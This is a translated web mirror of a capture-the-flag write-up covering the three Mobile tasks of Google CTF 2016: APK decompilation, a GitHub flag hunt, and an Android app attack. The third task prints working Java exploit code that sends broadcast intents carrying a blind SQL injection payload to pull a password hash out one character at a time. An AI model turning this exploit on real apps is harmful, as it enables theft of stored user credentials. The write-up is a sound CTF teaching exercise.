<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Analysis of tasks with Google CTF 2016: Mobile</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Intro 

 Yesterday for the first time the flag capture competitions organized by Google, Google Capture The Flag 2016, were over . The competition las...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Analysis of tasks with Google CTF 2016: Mobile</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/27c/0c6/735/27c0c67355af4e3087ef288770693acd.jpg"><br><br><h5>  Intro </h5><br><br>  Yesterday for the first time the flag capture competitions organized by <a href="https://capturetheflag.withgoogle.com/">Google, Google Capture The Flag 2016, were over</a> .  The competition lasted two days, during which it was necessary to squeeze out as many flags as possible from the proposed tasks.  The format of the competition is <b>task-based / jeopardy</b> . 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      As stated by Google, the tasks for this CTF were people who are employees of the Google security team.  Therefore, interest in these tasks, as well as to the first GCTF as a whole, was quite large - only 2500 teams were registered, of which, however, only 900 scored at least 5 points on the task solution (omitting bots and a few attempts to play is not fair).  Anyone could take part, ranging from rookie and security lovers to industry legends.  In addition, it was possible to participate alone. <br><br>  Most of the 2 days I picked the task category Mobile.  And this hub presents writeup `s of all tasks of this category.  Google offered only 3 tasks for Mobile (in others it was 5-6 each), but from this they were, perhaps, even better. <br><br>  Well, the water is over, go to the point :) <br><br><a name="habracut"></a><br><br><h3>  1. Ill Intentions </h3><br><br>  Task sounds like this: <br><br><blockquote>  Do you have ill intentions? <br>  <a href="https://drive.google.com/open%3Fid%3D0B6UCpz6PQYE9U0UweWRmM25RV3c">Ill Intentions.APK</a> <br></blockquote><br><br>  On a scale of difficulty from 5 to 300, 150 points were offered for the successful solution of this task. <br><br>  So, we have the APK in front of us and nothing else.  The first thing that comes to mind is installing the package on an emulator and decompiling the package.  And this will do. <br>  Hereinafter we will not dwell on technical details, but still it is worth saying that it has recently become possible to make a decompile using the fully automated GUI tool for <a href="https://apkstudio.codeplex.com/"><b>APK Studio</b></a> .  With it, you can automate the process of decompiling and subsequent assembly + APK signatures.  It is clear that the whole ‚Äúautomaton‚Äù is built on the same bundle apktool + dex2jar + (java decompiler, for example jd).  But I prefer the ‚Äúold-fashioned‚Äù and decompile the APK in semi-manual mode aka ‚Äúapktool + dex2jar + jd-gui + (set of my scripts)‚Äù. <br><br>  We will try to install "bad intentions" on the emulator, after looking at the minimal version of the Android SDK: <br><br><img src="https://habrastorage.org/files/c0f/a22/a0e/c0fa22a0e6984be69d8c38cecb7ddb39.png"><br><br>  I have emulators with the sixth android (Marshmallow) and 1 version below was not, so I decided to go the other way: convert low-level Smali-code into Java code (classes.dex -&gt; JAR`nik) and from java-sources reconstruct the application.  However, not everything turned out to be so sweet. <br><br>  If you look at the application manifest: <br><br><img src="https://habrastorage.org/files/599/578/9ce/5995789ce9bd46ca9e00e9f09f8230b7.png"><br><br>  there you can see 4 activities, the first of which is of no interest, and the next 3 clearly speak with their names that they are involved in the flag.  Looking at the reconstructed Java code for any of those three, you can see an interesting thing: <br><br><img src="https://habrastorage.org/files/965/879/65e/96587965e7704570886ddbff71c2d1c0.png"><br><br>  And the thing is that the flag calculation routine is partially moved to a lower code level - to the JNI level. <br>  Well, itching to immediately find the <i>computeFlag ()</i> function in native C ++ code.  To do this, we need to disassemble the native library (.so) hello-jni. <br>  But the fact that there (or rather, what is not there) will not please: <br><br><img src="https://habrastorage.org/files/6b7/3da/0f0/6b73da0f09b7419f9f57b3328a3b5136.png"><br><br>  IDA does not say a word about <i>computeFlag ()</i> in the lib ... and there is no call to this function anywhere in the Java code - only import. <br>  We conclude that the guys from Google in this way just postebatsya =) <br><br>  We return to the idea of ‚Äã‚Äãthe reconstruction of the application (creating your own identical APK).  Migrating Java code and its ‚Äúpre-reconstruction‚Äù is not a problem, but what can really create them is the import of native functions.  Their names were already higher, here they are: <br><br><ul><li>  Java_com_example_application_IsThisTheRealOne_perhapsThis </li><li>  Java_com_example_application_ThisIsTheRealOne_orThat </li><li>  Java_com_example_application_DefinitelyNotThisOne_definitelyNotThis </li></ul><br><br>  The last function speaks for itself (the banter from Google has already ended) - if it is disassembled and viewed, it will be possible to see that a static line is returned from it - <i>‚ÄúTold you so!‚Äù</i> , So we immediately forget about it. <br><br>  The names of native functions contain the package name + the name of the class from which (and only from which) they can be called in the Java code - otherwise an error will occur at the stage of calling the function from the high-level code.  Therefore, the restored application must exactly repeat the names used in the original APK, and the call to the native JNI functions must come from the corresponding Java classes. <br><br>  Knowing this, we make the restoration of the code.  The code of the ThisIsTheRealOne class and IsThisTheRealOne are largely identical - only the routine for calculating the string (the flag?) In the click method of the <i>onClick ()</i> button is <i>different</i> (see above). <br>  Let's modify the code that handles the click by adding at the end of the calculated lines to the log of the Android application: <br><br><pre><code class="java hljs">Log.d(<span class="hljs-string"><span class="hljs-string">"CTF"</span></span>, i.getStringExtra(<span class="hljs-string"><span class="hljs-string">"msg"</span></span>));</code> </pre> <br><br>  Having assembled the application, you will have to open the activity (ThisIsTheRealOne and IsThisTheRealOne) using the AM (activity manager) ADB utility, as the application interface does not allow doing this in gui mode (although this can be fixed by adding 5 lines of code, but it is too lazy). <br><br>  Here is the computed line from the ThisIsTheRealOne activity: <br><br> <code>KeepTryingThisIsNotTheActivityYouAreLookingForButHereHaveSomeInternetPoints! <br></code> <br><br>  But from IsThisTheRealOne: <br><br> <code>Congratulation!YouFoundTheRightActivityHereYouGo-CTF{IDontHaveABadjokeSorry} <br></code> <br><br>  Together with the flag, which says that Google does not joke badly.  Again banter?  :) <br><br><h3>  2. Can you repo it? </h3><br><br>  Task sounds like this: <br><br><blockquote>  Do you think of public repositories? <br></blockquote><br><br>  On a scale of difficulty from 5 to 300 for the successful solution of this task only 5 points were offered. <br><br>  During the study of ‚Äúbad intentions‚Äù, the Android resource file of the application containing the lines came across.  There are usually a lot of interesting things, and this time was no exception: <br><br><img src="https://habrastorage.org/files/94e/c5f/0ab/94ec5f0ab6cd446d866efc71948a6e87.png"><br><br>  Immediately striking <i>flag</i> , frequency cryptanalysis of the contents of which shows that this is most likely the cipher of Caesar.  Indeed, it turned out to be a Rot-13, but Google is hitting on those who really think that even 5 points can be given so easily.  Making a Rot-13 (Rot-13 ()): <br><br><blockquote>  Did you think that? </blockquote><br><br>  OK.  We'll have to think, well.  We need to find a public repository.  Most likely this is github.  And in order to find a flag on its expanses, you need something truly unique (the name of the user or repository).  Directly under the flag is exactly what can be so ‚Äútruly unique‚Äù: <br><br> <code>l33tdev42 <br></code> <br><br>  A simple googling does not give results, which at first somehow knocks out the forces ... but, going to the githab and doing a search for "l33tdev42" there, we stumble upon a unique user: <br><br><img src="https://habrastorage.org/files/472/c80/11e/472c8011e7964cc98cd231e191e9c8d6.png"><br><br>  Which has 1 single project with 3 commits ... the project is simple and there are three commits: <br><br><img src="https://habrastorage.org/files/39a/276/607/39a27660738a46a59e002ddd8a5ff144.png"><br><br>  Inside the last one just the right flag: <br><br><img src="https://habrastorage.org/files/9d6/2ad/2d0/9d62ad2d093b4eecbc5641c05efd08ac.png"><br><br> <code>ctf{TheHairCutTookALoadOffMyMind} <br></code> <br><br>  Frankly, 5 points - still not enough for such a task ... <br>  It was the very first task from Mobile, which managed to drag.  After it seemed that in tasks for 150 and more there are basically unresolvable tasks, but, as already mentioned, Google is jolting :) <br><br><h3>  3. Little Bobby Application </h3><br><br>  Task sounds like this: <br><br><blockquote>  Find the vulnerability <br>  submit your <a href="https://bottle-brush-tree.ctfcompetition.com/">apk</a> to <a href="https://bottle-brush-tree.ctfcompetition.com/">bottle-brush-tree.ctfcompetition.com</a> . <br>  Can take up to 15 minutes to return the result. <br><br>  <a href="https://drive.google.com/open%3Fid%3D0B6UCpz6PQYE9aktvTDh0NXBscmc">BobbyApplication_CTF.apk</a> <br><br>  Link: <br>  Upload your APK, and get the logs ... <br></blockquote><br><br>  On a scale of difficulty from 5 to 300, 250 points were offered for the successful solution of this task. <br><br>  You need to find a vulnerability in the Android application, write an exploit and using this exploit to pull the flag out of the real user.  The exploitability analysis is performed on the emulator on the server.  After an average of 13 minutes, the log of the exploit application returns to which you can write anything, but it is better to write a flag there, of course. <br>  At first glance, scary, but do not forget that Google loves jiving. <br><br>  Here‚Äôs what the bobby application looks like: <br><br><img src="https://habrastorage.org/files/086/d8b/b46/086d8bb465e348b7bc9c32da96c31e0c.png"><br><br>  A simple form for authorization and the possibility of registration.  Well, decompile time! <br>  Decompilation showed that the application uses Sqlite to store data with an interestingly designed Users table: <br><br><img src="https://habrastorage.org/files/985/72a/df0/98572adf00854c598defccd8ae27bb0e.png"><br><br>  The flag says that injection is all you need to do to get a flag. <br>  The dynamic part of the flag is md5 based on the user's password.  This hash should be dragged off using an exploit in order to ‚Äúcollect‚Äù the final flag. <br><br>  <b>We are looking for vulnerability.</b> <br><br>  This process was quite fast.  The application contained only 8 classes and finding the vulnerable module was not a problem.  The vulnerability was as follows: at start, the application registered a receiver of broadcast events received from outside: <br><br><img src="https://habrastorage.org/files/336/f31/3a6/336f313a65464ebb8e45d1def6b7c1d8.png"><br><br>  The handler of the incoming broadcasts was the successor class BroadcastReceiver, which contained the following code: <br><br><img src="https://habrastorage.org/files/ca1/a91/226/ca1a912267454c5ba58f3840e8ded569.png"><br><br>  But the implementation of the <i>checkLogin ()</i> method from the body of the handler of the incoming broadcast  ªa: <br><br><img src="https://habrastorage.org/files/f93/11b/558/f9311b558d57425098014250bb78d48f.png"><br><br>  As you can see, neither the method nor the broadcaster handler filter incoming data, which is then used to generate a ‚Äúraw‚Äù SQL query to the database. <br>  Manual operation has shown that there really is a security hole, allowing to modify the request through the form. <br><br>  Obviously, the Blind SQLi vulnerability, the <i>checkLogin ()</i> method, returns static input-independent strings. <br>  Nevertheless, depending on the number of records selected by the request (which can be controlled by an exploit), we can control the behavior of this method, sucking up 1 bit of information with each malicious request about any field in the database table (and the database itself and anything else), but we are interested in the password field, as mentioned above, for ‚Äúassembling‚Äù the flag. <br><br>  <b>We write an exploit.</b> <br><br>  Exploit Algorithm: <br><br><ol><li>  Launch the bobby application so that it launches the broadcast event receiver </li><li>  To form a malicious intent for the receiver with ‚Äúevil‚Äù data inside </li><li>  Send a broadcast event with an intent containing malicious data. </li><li>  Receive a response from the Bobby application's receiver about the result </li><li>  Repeat until all required data is ‚Äúsucked‚Äù character by character. </li></ol><br><br>  To implement the exploit, two classes were enough.  The code is small, so it is listed below: <br><br>  <i>The main activity of the exploit:</i> <br><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Main</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Activity</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-comment"><span class="hljs-comment">//       Unicode static int L = 0, R = (int)Math.pow(2,16); public static int symbolNum = 0; public static Main activity = null; public static StringBuilder flag = new StringBuilder(); public static void SendBroadcast() { if(Main.symbolNum&gt;32) { Main.Finish(); return; } //   . //         int M = (L+R)/2; Intent maliciousIntent = new Intent(); maliciousIntent.setAction("com.bobbytables.ctf.myapplication_INTENT"); maliciousIntent.putExtra("username", "???\" or unicode(substr(password," + symbolNum + ",1))&gt;" + M + " -- "); maliciousIntent.putExtra("password", "1"); activity.sendBroadcast(maliciousIntent); } public static void Finish() { //      Log.d("FLAG", Main.flag.toString()); Main.activity.finish(); } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); activity = this; //    ()  onReceive() Bobby- IntentFilter filter = new IntentFilter("com.bobbytables.ctf.myapplication_OUTPUTINTENT"); registerReceiver(new MalReceiver(), filter); //  Bobby- // (  -  ,      ) PackageManager pm = getPackageManager(); Intent intent = pm.getLaunchIntentForPackage("bobbytables.ctf.myapplication"); if (intent != null){ startActivity(intent); } //   ,        Handler handler = new Handler(); handler.postDelayed(new Runnable() { @Override public void run() { SendBroadcast(); } }, 2000); } }</span></span></code> </pre><br><br>  <i>Bobby answers receiver:</i> <br><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">MalReceiver</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">BroadcastReceiver</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-meta"><span class="hljs-meta">@Override</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onReceive</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Context context, Intent intent)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-comment"><span class="hljs-comment">//    Bobby- String answer = intent.getStringExtra("msg"); // SQL TRUE if(answer.compareToIgnoreCase("Incorrect password")==0) { //   Main.L = (Main.L + Main.R)/2; } // SQL FALSE else{ //   Main.R = (Main.L + Main.R)/2; } //  N-    if(Main.R-Main.L &lt;= 1) { Main.flag.append((char)Main.R); Main.symbolNum++; Main.L = 0; Main.R = (int)Math.pow(2,16); } Main.SendBroadcast(); } }</span></span></code> </pre><br><br>  After that, it remains only to send an exploit to the server to be tested. <br>  After 15 minutes‚Ä¶ <br><br>  Google returns the long-awaited log in which we find: <br><br><img src="https://habrastorage.org/files/f9b/eb8/ae6/f9beb8ae64694b869d2be01a7e8525d4.png"><br><br>  It remains a trifling matter - to substitute a hash into a flag: <br><br> <code>ctf{An injection is all you need to get this flag - 106b826d7d5ec465b0c5d385a41c6ff6} <br></code> <br><br>  That's all. <br><br>  Now a little about how Google mocked the ones who tried to solve this task.  It was pretty tricky - immediately after the start of the exploit with the Bobby application on the Android emulator, a <a href="https://habrahabr.ru/post/131637/">monkey</a> started on the server (as seen in the returned log), which ‚Äúbombed‚Äù all the components of the system with random actions, for example, from time to time exploit activity.  At first it was unclear what interrupted the work of the exploit - there were no errors about departures in the log, there were impressions that there was a time limit.  Anyway, it was possible to suck out the flag successfully only with 3 attempts. <br><br>  In the expo code above, there is a minimum set of actions that demonstrates the general concept. <br>  What actually happened in practice contains a ton of code for protection against monkey, for banning the launch of more than 1 instance of the receiver on the Bobby side, etc. <br><br><h5>  Outro </h5><br><br>  Since I focused on the security of mobile applications, I hardly managed to fully appreciate the ‚Äúfan‚Äù of Google‚Äôs tasks, but based on what had to be overcome, I can say for sure that the GCTF turned out to be quite interesting, and in many respects the interest is provided by numerous attempts banter over participants.  At such moments, when you realize that you have been ‚Äúreassured‚Äù again, you feel a rush of some kind of ‚Äúblack‚Äù motivation =) <br><br>  Thanks, google, it was interesting;) </div><p>Source: <a href="https://habr.com/ru/post/282846/">https://habr.com/ru/post/282846/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../282828/index.html">HDD is dedicated to: pacify the application, voracious on disk time</a></li>
<li><a href="../282832/index.html">LinkedIn opens mega-data center in Singapore</a></li>
<li><a href="../282836/index.html">The digest of interesting materials from the world of web development and IT for the last week ‚Ññ209 (April 25 - May 1, 2016)</a></li>
<li><a href="../282838/index.html">What happened to google maps?</a></li>
<li><a href="../282844/index.html">Entity ‚Äúframework‚Äù for PHP from one class</a></li>
<li><a href="../282848/index.html">Read more about the development of x-ray tomograph software</a></li>
<li><a href="../282850/index.html">Call Interception at 3CX Phone System</a></li>
<li><a href="../282852/index.html">Application server 1C on Linux</a></li>
<li><a href="../282854/index.html">Happy shipper</a></li>
<li><a href="../282858/index.html">MikroTik and 192.168.0.0/24</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>